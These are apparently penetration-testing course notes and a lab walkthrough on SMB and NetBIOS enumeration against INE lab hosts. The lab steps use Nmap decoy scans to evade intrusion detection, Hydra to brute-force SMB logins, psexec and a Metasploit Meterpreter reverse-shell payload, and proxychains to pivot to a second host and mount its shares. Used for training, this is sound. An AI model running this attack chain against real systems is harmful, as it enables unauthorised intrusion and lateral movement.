# Networking

sA is the Ack Scan (Sends a Ack packet).

`nmap -sn [target IP]`

`nmap -Pn -sS -F [target IP]`

We can confirm if ports get filitered with:

`nmap -Pn -sA p-445,3389 [targetIP]`

Filtered/Closed: Firewall
unfilitered: No filtering, detection

IDS Evasion:

`nmap -Pn -sS -sV -F [targetIP]`

`sudo wireshark`

We get an issue, but thats ok. We run the scan and record the traffic. We don't run any IDS evasion here.

NMAP sends a SYN, we get back a SYY-ACK or RST, if we get a SYN-ACK we send back a RST

Decoy IP:

nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.23.1,10.10.23.2 [targetIP]

# Network Enumeration

- After the host discovery and port scanning phase of a penetration test, the next logical phase is going to involve service enumeration.
- The goal of service enumeration is to gather additional, more specific/detailed information about the host/systems on a network and the service running on said host.
- This includes information like account names, shares, misconfigured services and so on.
- Like the scanning phase, enumeration involves active connection to the remote devices in the network.
- There are many protocols on neworked systems that an attacker can target if they have been misconfigured or have been left enabled.
- In this section of the course, we will be exploring the various tools and techniques that can be used to interact with these protocols, with the intent of eventually/potentially exploiting them in later phases.
![grafik](https://github.com/user-attachments/assets/7985c1c1-7b0b-4e4a-af5d-3d681c1fdd0a)

# SMB / NetBIOS Enumeration

- NetBIOS is an API and a set of network protocols for providing communication services over a local network.
- Functions: NetBIOS offers three primary services:
  - Name Service (NetBIOS-NS): Allows computers to register, unregister and resolve names in a local network.
  - Datagram Service (NetBIOS-DGM): Supports connectionsless communication and broadcasting.
  - Session Service (NetBIOS-SSN): Support connection-oriented communication for more reliable data transfers.
- Ports: NetBIOS typically uses ports 137 (Name Service). 138 (Datagram Service), and 139 (Session Service) over UDP and TCP

- SMB is a file sharing protocol
- Functions: SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.
- Versions:
  - SMB 1.0: the original version which had security vulnerabilities. It was used with older operating systems like WinXP.
  - SMB 2.0/2.1: Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
  - SMB 3.0+: Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
- Ports: SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

- While NetBIOS and SMB were once closely linked, modern networks rely primarly on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
- Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together


# SMB & NetBIOS Enumeration and Exploitation

## Objective

The objective of this exercise is to enumerate and exploit the SMB services on two target systems. Using tools such as `Nmap`, `Hydra`, `Metasploit`, and `Proxychains`, you will learn to identify and exploit vulnerabilities in SMB services. Additionally, the lab demonstrates pivoting techniques and how to mount shared drives in the target network.

## Lab Environment

In this lab, you will access a Kali GUI instance. Two vulnerable SMB services are accessible via Kali tools at `http://demo.ine.local` and `http://demo1.ine.local`.

### Goal:
Exploit both targets and find the flag!

## Tools

The best tools for this lab are:

- `Metasploit Framework`
- `Nmap`
- `Hydra`
- `Proxychains`

## SMB / NetBIOS Enumeration

### What is NetBIOS?
NetBIOS is an API and a set of network protocols that provide communication services over a local network.

### Functions:
- **Name Service (NetBIOS-NS):** Allows computers to register, unregister, and resolve names in a local network.
- **Datagram Service (NetBIOS-DGM):** Supports connectionless communication and broadcasting.
- **Session Service (NetBIOS-SSN):** Supports connection-oriented communication for more reliable data transfers.

### Ports:
NetBIOS typically uses ports 137 (Name Service), 138 (Datagram Service), and 139 (Session Service) over UDP and TCP.

### What is SMB?
SMB is a file-sharing protocol.

### Functions:
SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.

### Versions:
- **SMB 1.0:** The original version with known security vulnerabilities, used with older operating systems like Windows XP.
- **SMB 2.0/2.1:** Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
- **SMB 3.0+:** Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.

### Ports:
SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

While NetBIOS and SMB were once closely linked, modern networks primarily rely on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS. Modern implementations of Windows mainly use SMB and can work without NetBIOS; however, NetBIOS over TCP 139 is often enabled for backward compatibility.

### Demo:

1. **Display the Hosts File:**

   `cat /etc/hosts`

   *Displays the hosts file to see which names and IP addresses are configured on the system.*

2. **Test Connectivity:**

   `ping demo.ine.local`

   *Ping command to test the reachability of the first target.*

3. **Network Scan:**

   `nmap demo.ine.local`

   *Scan the target machine to identify open ports and services.*

4. **NetBIOS Enumeration:**

   `nbtscan`  
   `whatis nbtscan`  
   `nbtscan 10.2.21.216/24`

   *Use `nbtscan` to identify NetBIOS names in the network.*

5. **Resolve NetBIOS Name:**

   `nmblookup -A demo.ine.local`

   *`nmblookup` resolves the NetBIOS name and returns information about the target machine.*

6. **NetBIOS Port Scan:**

   `nmap -sU -p 137 demo.ine.local`

   *Scan the NetBIOS port to determine if the service is running.*

7. **SMB Enumeration:**

   `nmap -sV -p 139,445 demo.ine.local`

   *Scan the SMB ports (139, 445) to find out which SMB versions are supported on the system.*

8. **Identify SMB Versions:**

   `nmap -p 445 --script smb-protocols demo.ine.local`

   *Identify the SMB versions supported on the target system.*

9. **Check SMB Security Mode:**

   `nmap -p 445 --script smb-security-mode demo.ine.local`

   *Check the security mode of SMB to identify potential vulnerabilities.*

10. **Use SMB Client:**

    `smbclient -L demo.ine.local`

    *Attempt an anonymous login to the SMB service to browse shared resources.*

11. **User Enumeration:**

    `nmap -p 445 --script smb-enum-users.nse demo.ine.local`

    *Enumerate users available on the SMB service.*

12. **Brute-Force SMB:**

    `vim users.txt`

    *Create a `users.txt` file with usernames for brute-force attacks.*

    `hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`

    *Run `Hydra` to brute-force the SMB login using a wordlist.*

13. **Gain SMB Access:**

    `psexec.py administrator@demo.ine.local`

    *Use `psexec` to obtain a shell on the target system.*

14. **Start a Meterpreter Session:**

    `start msfconsole -q`  
    `search psexec`  
    `use [module]`  
    `set payload windows/x64/meterpreter/reverse_tcp`  
    `set rhosts demo.ine.local`  
    `set SMBuser Administrator`  
    `set SMBPass password1`  
    `exploit`

    *Use Metasploit to start a Meterpreter session on the target system.*

15. **Attack the Second System:**

    `meterpreter:shell`  
    `meterpreter:ping demo1.ine.local`  
    `meterpreter:run autoroute -s demo.ine.local/20`  
    `meterpreter:background`

    *Use the current session to scan and exploit the second target system.*

16. **Use Proxychains:**

    `cat /etc/proxychains4.conf`

    *Configure Proxychains to connect to the second target system via the first target.*

    `metasploit psexec: search socks`  
    `use 0`  
    `show options`  
    `set version 4a`  
    `set SRVPORT 9050`  
    `exploit`  
    `proxychains nmap demo1.ine.local -T4 -Pn -sV -p 445`

    *Use `Proxychains` to access and scan the second target through the first.*

17. **Mount Shared Drives:**

    `net use D: \\[Demo1]\Documents`  
    `net use K: \\[Demo1]\K$`  
    `dir K:\`

    *Mount shared drives from the second target system onto the first to access files.*
